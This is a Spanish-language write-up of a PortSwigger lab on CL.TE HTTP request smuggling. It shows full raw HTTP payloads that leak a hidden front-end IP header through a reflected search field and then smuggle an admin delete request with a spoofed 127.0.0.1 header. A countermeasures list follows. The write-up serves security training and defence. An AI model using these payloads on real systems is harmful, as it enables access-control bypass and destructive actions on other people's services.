# Writeup: Exploiting HTTP request smuggling to reveal front-end request rewriting (PortSwigger)

- **Lab**: Exploiting HTTP request smuggling to reveal front-end request rewriting
- **URL**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
- **Categoría**: HTTP Request Smuggling / CL.TE desync / Header leak via reflected endpoint
- **Dificultad**: Practitioner

---

## 1. Objetivo

Lab CL.TE de dos fases. El front-end agrega un header `X-???-IP` (nombre random no documentado, distinto a `X-Forwarded-For`) con la IP real del cliente. El back-end usa ese header para autorizar `/admin` solo cuando vale `127.0.0.1`. Hay que:

1. **Descubrir el nombre exacto del header** smugleando un `POST /` con `search=` y `Content-Length` grande para que absorba el inicio de la request 2 (que el front-end ya rewriteó con el header). El motor de search refleja los bytes absorbidos en `<h1>... search results for '...'</h1>` → leak.
2. **Usar el header descubierto con valor `127.0.0.1`** en un smuggle a `/admin/delete?username=carlos` para bypassar el control de IP y eliminar a `carlos`.

Header descubierto en esta sesión: **`X-ZuJFJu-Ip`** (los 6 chars centrales son random por instancia del lab).

Payload final fase 2 (HTTP/1.1, Update-Content-Length desactivado, Send group in sequence single connection):

```http
POST / HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 211
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
X-ZuJFJu-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Mandar dos veces seguidas en single connection. Response 2: `302 Found / Location: /admin / Set-Cookie: session=...`. Lab solved.

### Insight central

**El smuggling permite leer headers que el front-end agrega normalmente invisibles, usando un endpoint reflexivo + Content-Length absorbente como "interceptor de headers"**. El truco: la request 2 que el cliente envía (con headers ya rewriteados por el front-end al pasar por él) se concatena al body del smuggled request gracias al `Content-Length: 400` interno. Si el smuggled request es un POST a un endpoint que refleja el body parseado, los headers de request 2 quedan dentro del HTML reflejado. Es una primitiva de leak general, no específica a este lab.

Una vez conocido el nombre del header de IP rewriting, plantar `127.0.0.1` en él dentro de un smuggled GET /admin bypassa el control. El front-end solo agrega ese header a requests que él procesa — no toca lo que el back-end lee del socket buffer.

---

## 2. Recon y resolución

### 2.1 Reconnaissance del endpoint reflexivo

Captura de un search legítimo del lab:

```http
POST / HTTP/2
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

search=Here
```

Response (200) refleja el término en el HTML del home:

```html
<section class=blog-header>
    <h1>8 search results for 'Here'</h1>
    <hr>
</section>
```

Reflejo dentro de comillas simples, sin escaping evidente de caracteres especiales (CRLF, espacios) → reflejo apto para leakear bytes binarios incluyendo headers HTTP completos.

### 2.2 Setup de Burp

1. Capturar el POST /, mandar al Repeater.
2. Downgrade a HTTP/1.1 (HTTP/2 binariza el body, no permite ambigüedad CL/TE).
3. Settings del Repeater → desmarcar "Update Content-Length".
4. Send group → cambiar al modo **"Send group in sequence (single connection)"**.

### 2.3 Fase 1: smuggle de leak

```http
POST / HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 216
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

search=
```

Conteo del outer body (CL=216):

| Línea | Bytes | Acum |
|---|---|---|
| `0\r\n` | 3 | 3 |
| `\r\n` | 2 | 5 |
| `POST / HTTP/1.1\r\n` | 17 | 22 |
| `Host: 0abf...academy.net\r\n` | 65 | 87 |
| `Cookie: session=...\r\n` | 50 | 137 |
| `Content-Type: application/x-www-form-urlencoded\r\n` | 49 | 186 |
| `Content-Length: 400\r\n` | 21 | 207 |
| `\r\n` | 2 | 209 |
| `search=` | 7 | **216** |

`Content-Length: 400` interno es el absorbente: necesita 400 bytes de body, ya tiene `search=` (7), faltan 393 bytes que vienen del inicio de la request 2 forwardeada por el front-end (incluyendo el header `X-???-IP` que ese front-end agrega).

Send group en sequence. Response 2:

```html
<h1>0 search results for 'POST / HTTP/1.1
X-ZuJFJu-Ip: 152.203.247.18
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 216
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0'</h1>
```

Leakeado: el header `X-ZuJFJu-Ip: 152.203.247.18` aparece en la segunda línea — lo agregó el front-end con la IP real del cliente. `152.203.247.18` es la IP pública desde donde Burp Repeater conectó.

Notas:
- El nombre `X-ZuJFJu-Ip` tiene 6 chars random (`ZuJFJu`) generados por instancia del lab. PortSwigger genera headers con nombres únicos por sesión para forzar el descubrimiento dinámico — no se puede hardcodear de un writeup a otro.
- El reflejo se cortó a los 400 bytes (la cuenta de `search=` + bytes absorbidos), incluyendo todos los headers de la request 2 + el inicio del body de la request 2 (que es a su vez la outer POST de la request 2 con su propio chunked body).

### 2.4 Fase 2: smuggle del delete con `127.0.0.1` en el header descubierto

```http
POST / HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 211
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
X-ZuJFJu-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Conteo del outer body (CL=211):

| Línea | Bytes | Acum |
|---|---|---|
| `0\r\n` | 3 | 3 |
| `\r\n` | 2 | 5 |
| `GET /admin/delete?username=carlos HTTP/1.1\r\n` | 44 | 49 |
| `Host: 0abf...academy.net\r\n` | 65 | 114 |
| `X-ZuJFJu-Ip: 127.0.0.1\r\n` | 24 | 138 |
| `Content-Type: application/x-www-form-urlencoded\r\n` | 49 | 187 |
| `Content-Length: 10\r\n` | 20 | 207 |
| `\r\n` | 2 | 209 |
| `x=` | 2 | **211** |

Send group en sequence. Response 2:

```http
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=DDdOTKyKeRZMobwYn2m3jF2bIbihYr2a; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```

Lab solved al primer intento. Mismo Set-Cookie del cliente fantasma que en CL.TE/TE.CL bypass.

---

## 3. Por qué funciona

### 3.1 Anatomía de la fase 1 (leak via reflection + absorbing CL)

```
Cliente → Front-end (CL=216, agrega X-ZuJFJu-Ip) → Back-end (TE chunked)
```

**Frontend (CL=216, agrega `X-ZuJFJu-Ip: <client-ip>`)**:
- Lee 216 bytes del body.
- Forwardea outer headers (con X-ZuJFJu-Ip agregado) + 216 bytes al backend.

**Backend (TE chunked)**:
- Parsea chunked: `0\r\n\r\n` → body terminado en byte 5.
- Responde a `POST /` (outer) con la home (200 OK).
- Bytes restantes en buffer (211 bytes): el smuggled `POST /` con headers + `Content-Length: 400` + body parcial `search=`.

**Cliente manda request 2** (idéntica). Frontend la procesa y agrega su X-ZuJFJu-Ip otra vez.

**Backend procesa el smuggled `POST /`**:
- Lee request line + headers del smuggled (204 bytes consumidos del buffer).
- Body del smuggled: necesita CL=400 bytes. Ya tiene `search=` (7 bytes residuales). Faltan 393 bytes.
- Backend bloquea esperando body. Frontend forwardea request 2. Sus bytes llegan al socket buffer.
- Backend lee 393 bytes del inicio de la request 2 forwardeada → completa el body del smuggled.

El body del smuggled queda como:
```
search=POST / HTTP/1.1
X-ZuJFJu-Ip: 152.203.247.18    ← header agregado por el front-end a la req 2
Host: 0abf00e5040d8d73859c857800680094.web-security-academy.net
Cookie: session=6bzw3bITjWQrUTdNc9FMsEssnVLe0pbc
Content-Type: application/x-www-form-urlencoded
Content-Length: 216
Transfer-Encoding: chunked

0

POST / HTTP/1.1
[más bytes hasta llegar a 400]
```

El motor de search del back-end form-decodea ese body, toma el valor de `search` (que se extiende hasta el primer `&` o EOF de body — en este caso EOF a los 400 bytes), y renderea `<h1>X search results for '<contenido>'</h1>`.

El cliente ve esa response como response 2 → lee `X-ZuJFJu-Ip: 152.203.247.18` literal → identifica el header.

### 3.2 Por qué el front-end no puede prevenir el leak

El front-end agrega `X-ZuJFJu-Ip` a cada request que él procesa, sobrescribiendo cualquier valor previo (esa es la defensa típica contra spoofing — "el front-end es la fuente de verdad para la IP del cliente"). Pero esa defensa solo aplica a requests que pasan por el front-end.

El smuggled request no pasa por el front-end: vive en bytes opacos dentro del body de la outer POST. El front-end ve esos bytes como "datos de un POST cualquiera", no como una request HTTP. Por eso no puede stripear ni sobrescribir headers en el smuggled — no sabe que es una request.

Para el back-end, en cambio, el smuggled SÍ es una request HTTP (porque el back-end la parsea desde el socket buffer). El back-end ve los headers que el atacante puso en el smuggled, sin filtrado.

Resultado: el atacante controla 100% de los headers del smuggled, incluyendo el `X-ZuJFJu-Ip`. El front-end es bypassed.

### 3.3 Por qué `Content-Length: 400` interno es la primitiva de leak

Mismo principio que el `Content-Length: 10` en el bypass anterior, pero usado para diferente fin:

- **Lab CL.TE bypass `/admin`**: CL chico (10) para absorber solo lo necesario y evitar `Duplicate header names`. Foco: que el smuggled GET /admin se procese limpio.
- **Lab reveal request rewriting**: CL grande (400) para absorber TODOS los headers de la request 2 + un poco del body. Foco: que esos bytes terminen como contenido form-decodeable que el endpoint reflexivo va a renderear.

La técnica subyacente — **Content-Length interno en el smuggled como "absorbente" de bytes de la request 2** — es la misma. Cambia la cantidad y el propósito.

Generalización: cualquier endpoint reflexivo (search, error pages que muestran input, logging visible al usuario) combinado con CL absorbente convierte el smuggle en un leak de headers. Esta primitiva tiene aplicaciones más allá de este lab: leakear `Authorization`, `X-API-Key`, JWT en headers, IP de red interna, etc.

### 3.4 Por qué `127.0.0.1` en el header rewritten bypassa el control de admin

El back-end implementa la restricción "/admin solo desde 127.0.0.1" leyendo `X-ZuJFJu-Ip` y comparando. La asunción del back-end: "el front-end siempre agrega este header con la IP correcta del cliente, por eso puedo confiar en él".

Esa asunción se rompe con smuggling porque:
1. El front-end solo agrega el header a requests que él procesa.
2. El smuggled request no pasa por el front-end.
3. El back-end no puede distinguir entre "X-ZuJFJu-Ip agregado por el front-end" y "X-ZuJFJu-Ip plantado por el atacante en el smuggled".

Es el mismo patrón de los labs anteriores con `Host: localhost` (back-end confía en un header como autorización), pero más sutil porque:
- El nombre del header es secret-by-obscurity (random), lo que parecería defenderlo.
- La defensa de "front-end sobrescribe" funciona contra clientes externos normales, falla solo cuando hay desync.

El secret-by-obscurity es derrotado por el endpoint reflexivo + CL absorbente. Los dos juntos son fatales.

### 3.5 Diferencia entre los tres labs de bypass del cluster

| Aspecto | CL.TE bypass `/admin` | TE.CL bypass `/admin` | Reveal request rewriting |
|---------|----------------------|----------------------|-------------------------|
| Desync | CL.TE | TE.CL | CL.TE |
| Bypass del back-end via | `Host: localhost` | `Host: localhost` | `X-???-IP: 127.0.0.1` |
| Header conocido a priori | Sí (`Host`, estándar) | Sí (`Host`, estándar) | No (random por instancia) |
| Fases | 1 (directo) | 1 (directo) | 2 (leak + uso) |
| Primitiva nueva | CL interno como trituradora de headers | (igual) | CL interno como absorbente para reflexión |
| Endpoint reflexivo necesario | No | No | Sí (`POST /` con `search=`) |
| Iteraciones experimentales | 4 (resolución incremental) | 3 (off-by-one en chunk size) | 2 (sin tropiezo, fase 1 + fase 2) |

Este lab introduce el patrón de **smuggling + leak vía reflexión** que es composable con cualquier feature reflexiva. Los dos anteriores son el patrón más simple de "smuggle directo a recurso restringido".

### 3.6 Por qué nombrar el header al azar no defiende

PortSwigger generó `X-ZuJFJu-Ip` como nombre random esperando, presumiblemente, que un atacante sin acceso al código del front-end no pudiera adivinarlo. La defensa falla porque:

1. **El smuggling expone el header al cliente vía reflexión**, sin necesidad de adivinar.
2. **El nombre es estable durante la vida del lab** — basta descubrirlo una vez y reutilizarlo.
3. **El espacio de nombres válidos para "IP rewriting" es chico**: `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `X-Originating-IP`, etc. Si el reflexion no estuviera disponible, un atacante podría hacer fuzzing dirigido con esa lista en pocos minutos.

Lección defensiva: nombres random no son una defensa. Son obfuscation, no security. Aplica al header, al nombre del cookie de sesión, al endpoint admin (`/admin-9c7b3f` en lugar de `/admin`), etc. Todos rompibles con leak directo o fuzzing.

La defensa real: validar identidad/autorización con autenticación criptográfica (JWT firmado, mTLS, cookies de sesión validadas), no con headers que asume que solo el front-end puede setear.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Capturar POST / search legitimo - confirmar reflejo en HTML]
    B[2. Smuggle fase 1: POST /search con CL=400 absorbente]
    C[3. Backend procesa smuggled, body absorbe headers de req 2]
    D[4. Response 2: search results refleja X-ZuJFJu-Ip: client-ip]
    E[5. Identificar nombre del header en el HTML reflejado]
    F[6. Smuggle fase 2: GET /admin/delete con X-ZuJFJu-Ip: 127.0.0.1]
    G[7. Backend confia en header smuggled, ejecuta delete]
    H[8. 302 Found, carlos eliminado]

    A --> B --> C --> D --> E --> F --> G --> H
```



Tres ideas:

1. **Smuggling + endpoint reflexivo + Content-Length absorbente = leak de headers que el front-end agrega**. Es una primitiva composable: cualquier feature que refleje input del cliente (search, error pages, logs visibles) sirve como "ventana" para leer headers que viven solo entre el front-end y el back-end. Aplica a leakear headers de IP rewriting, auth tokens, API keys, internal routing metadata. La técnica es independiente del lab específico.

2. **Nombres random de headers no son defensa**. PortSwigger usó `X-ZuJFJu-Ip` esperando que el nombre random impidiera el ataque. Falla por dos vías independientes: (a) el smuggling lo expone vía leak directo en una sola request, (b) el espacio de nombres semánticamente válidos para "IP del cliente" es chico (~10 nombres comunes), fuzzing dirigido lo encontraría en minutos. Obfuscation ≠ security: aplica también a paths admin random, nombres de cookies, etc.

3. **Tres labs de bypass del cluster comparten la misma primitiva**: el `Content-Length` interno absorbente del smuggled. Cambia el uso (trituradora de headers en `/admin` bypass, absorbente para reflexión acá) pero la mecánica HTTP es idéntica. Una vez entendida la primitiva, los tres labs caen rápidamente — la diferencia operacional principal está en qué bytes se absorben y para qué se usan.

---

## 5. Contramedidas

1. **HTTP/2 entre frontend y backend**: bodies framed binariamente, sin ambigüedad CL/TE. Cierra smuggling por construcción. Defensa estructural — no requiere cambios en lógica de la app.
2. **Rechazar requests con CL y TE simultáneos en el frontend**: respondiendo 400. RFC 9112 lo permite explícitamente.
3. **No usar headers HTTP como mecanismo de autenticación**: la autorización a `/admin` debe basarse en sesiones/tokens validados criptográficamente, no en `X-ZuJFJu-Ip == 127.0.0.1`. Headers son fakeables tanto por smuggling como por proxies internos mal configurados.
4. **Si el front-end agrega headers de IP rewriting, el back-end debe stripearlos primero y solo confiar en lo que él agrega de cero**: secuencia "remove + add", no "trust if present". Misma lógica para `X-Forwarded-For` / `X-Real-IP` / equivalentes.
5. **Backend con parser HTTP estricto**: rechazar `Transfer-Encoding` con valores no estándar, headers duplicados, encodings obfuscados.
6. **Sin keep-alive entre frontend y backend**: cada request abre conexión nueva. Bytes smuggled no encuentran socket compartido. Costo: latencia + file descriptors.
7. **Nombres random NO son defensa de seguridad**: si tu modelo de amenaza incluye atacantes con leak de bytes (smuggling, log exposure, error pages verbosas), nombres random caen en una request. Usalo como obfuscation contra script kiddies, no como auth.
8. **Endpoints reflexivos: escapar/sanitizar input antes de renderear**: no es la defensa contra el smuggling per se, pero limita la primitiva de leak. Si el HTML escapado no permite ver CRLFs o caracteres binarios, la lectura del header se vuelve más difícil. Defensa-en-profundidad, no primaria.
9. **WAF con reglas de smuggling**: detectar `Transfer-Encoding: chunked` combinado con `Content-Length` en la misma request. Detectar `0\r\n\r\n` seguido de método HTTP en el body.
10. **Logging de endpoints reflexivos con input que contiene bytes HTTP-like**: una request `search=POST / HTTP/1.1\nHost:...` es señal de smuggling exitoso o intento. Alertar.
11. **Tests de regresión con `smuggler.py` o Burp Smuggler en CI**: ejecutar suite de payloads conocidos contra staging pre-deploy.
12. **Connection: close en respuestas si el frontend detecta length mismatch**: si el frontend ve discrepancia entre lo forwardeado y lo que el backend reportó haber procesado, forzar cierre de conexión.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting*. https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
- PortSwigger Web Security Academy. (s.f.). *HTTP request smuggling*. https://portswigger.net/web-security/request-smuggling
- PortSwigger Research. (2019). *HTTP Desync Attacks: Request Smuggling Reborn* (James Kettle). https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- IETF. (2022). *RFC 9112: HTTP/1.1*. https://datatracker.ietf.org/doc/html/rfc9112 (sección 6.3 Message Body Length)
- IETF. (2014). *RFC 7230: HTTP/1.1 Message Syntax and Routing*. https://datatracker.ietf.org/doc/html/rfc7230 (obsoleta pero aún citada)
- OWASP Foundation. (s.f.). *HTTP Request Smuggling*. https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
- MITRE Corporation. (2024). *CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')*. https://cwe.mitre.org/data/definitions/444.html
- MITRE Corporation. (2024). *ATT&CK Technique T1190: Exploit Public-Facing Application*. https://attack.mitre.org/techniques/T1190/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Request Smuggling*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- defparam. (s.f.). *smuggler — HTTP Request Smuggling detection tool* [Software]. GitHub. https://github.com/defparam/smuggler
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 17 (Attacking Application Architecture).
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md)
- Writeup detección CL.TE: [`learning/portswigger/confirming-cl-te-via-differential-responses/writeup.md`](../confirming-cl-te-via-differential-responses/writeup.md)
- Writeup CL.TE bypass `/admin`: [`learning/portswigger/bypass-front-end-controls-cl-te/writeup.md`](../bypass-front-end-controls-cl-te/writeup.md)
- Writeup TE.CL bypass `/admin`: [`learning/portswigger/bypass-front-end-controls-te-cl/writeup.md`](../bypass-front-end-controls-te-cl/writeup.md)
